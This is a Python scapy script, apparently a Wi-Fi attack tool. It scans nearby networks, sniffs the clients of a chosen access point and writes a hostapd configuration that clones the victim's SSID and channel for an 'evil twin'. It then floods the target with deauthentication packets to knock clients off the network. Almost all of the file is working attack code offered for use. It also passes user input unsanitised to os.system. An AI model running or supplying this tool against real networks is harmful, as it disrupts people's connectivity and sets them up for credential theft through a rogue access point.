#!/usr/bin/env python
from scapy.all import *
import os
import argparse
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import signal
import threading
from sys import platform
import colorama
from colorama import Fore, Style, Back
import fileinput,sys

def sniffClients(wlan,BSSID):
		global a
		a = BSSID
		interupted = False
		try:
			sniff(iface=wlan, prn=getClients, stop_filter=interupted )
			while True:
	        		time.sleep(1)
		except KeyboardInterrupt:
			interupted = True

def getClients(pkt):
	#print(a)
	global voc
	voc = {} #vocabulary for all the pkt info
	#voc[str(a)] = str(a)
	bssid = pkt[Dot11].addr3
	target_bssid = a
	if target_bssid == bssid and not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeReq) and not pkt.haslayer(Dot11ProbeResp):
		if str(pkt.summary()) not in voc:
			print pkt.summary()
		voc[str(pkt.summary())] = True
	#print pkt.summary()

def DeAuthLoop(interface, brdMac, BSSID, numOfPack):
	for i in range(0,numOfPack):               
			#This creates a Dot11Deauth packet that will be used to kick everyone out of the target network
			#Addr1 is the broadcast addr
			#Addr2 is the target addr
			#Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network 
			pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
			sendp(pkt, iface = interface, count = 100000000, inter = .001) #Send deauth packet

def main():
  wlan = raw_input(Fore.LIGHTBLUE_EX + "\nenter interface to turn into monitor mode: ")

  os.system("sudo ip link set " + wlan + " down")
  os.system("sudo iw " +  wlan + " set type monitor")
  os.system("sudo ip link set " + wlan + " up")

  #sudo iw wlan0 set type managed = change back to regular wifi mode.

  interface = raw_input(Fore.LIGHTYELLOW_EX + "\nenter interface to scan wifi networks with: ")
  try:
    print("Press Ctrl-C to finish scanning for networks")
    known={} #we arrange all of the networks we have found in known so that we will not print the network information twice on the terminal.
    def callback(frame):
      if frame.haslayer(Dot11):
        if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
    
          source=frame[Dot11].addr2
          if source not in known: #if the network we found is not in 'known' 
            ssid = frame[Dot11Elt][0].info #save the ssid
            channel = frame[Dot11Elt][2].info #save the channel of the network
            channel = int(channel.encode('hex'), 16) #transfer it to hex numbers.
            print ("SSID: '{}', BSSID: {}, channel: {}".format(ssid, source, channel)) #print the network information.
            known[source]=(ssid , channel) #add the network to 'known'
    
    sniff(iface=interface, prn=callback)
  except KeyboardInterrupt:
    print("Press Ctrl-C to finish scanning for networks")
    pass

  print("Dauth stage: ")
  BSSID = raw_input('Please enter the BSSID/MAC address of the AP: ') #Let the user input the MAC address of the router

  print 'Changing ' + wlan + ' to channel ' + str(known[BSSID][1])
  os.system("iwconfig %s channel %d" % (wlan, known[BSSID][1]))
  
  #changing hostapd.conf channel to the victim's wifi channel.
  filename = "/root/eviltwinfiles/hostapd.conf"
  text = str("#Set wifi interface" + "\n" + "interface=wlan0" + "\n" + "#Set network name" + "\n" + "ssid=" + str(known[BSSID][0]) + "\n" + "#Set channel" + "\n" + "channel=" + str(known[BSSID][1]) + "\n" + "#Set driver" + "\n" + "driver=nl80211")
  f = open(filename,'w')
  f.close()
  f = open(filename,'w')
  f.write(text)
  f.close()


  sniffClients(wlan,BSSID)
  brdMac = raw_input('Please enter the BSSID/MAC address of the client you wish to attack: ')
  


  print('Sending deauth packets now, press ctrl+c to end the attack')
  print(''*2)

  numOfPack = int(raw_input("how many packets do u wish to send? "))
  #infinite loop to keep the attack running forever, this loop is for setting up the deauth packet and sending it
  DeAuthLoop(interface, brdMac, BSSID, numOfPack)
  while True:
  	ans = raw_input("DONE! do you want to keep attacking? (n/y): ")
	if(ans =='y'):
		numOfPack = int(raw_input("how many packets do u wish to send? "))
		#infinite loop to keep the attack running forever, this loop is for setting up the deauth packet and sending it
		DeAuthLoop(interface, brdMac, BSSID, numOfPack)
	else:
		print("finishing attack")
		ans2 = raw_input("do you wish to turn your interface to managed mode again? (y/n):  ")
		if(ans2 =='y'):
			os.system("sudo ip link set " + wlan + " down")
			os.system("sudo iw wlan0 set type managed")
			os.system("sudo ip link set " + wlan + " up")
			break
		else:
			break

if __name__ == "__main__":
	main()
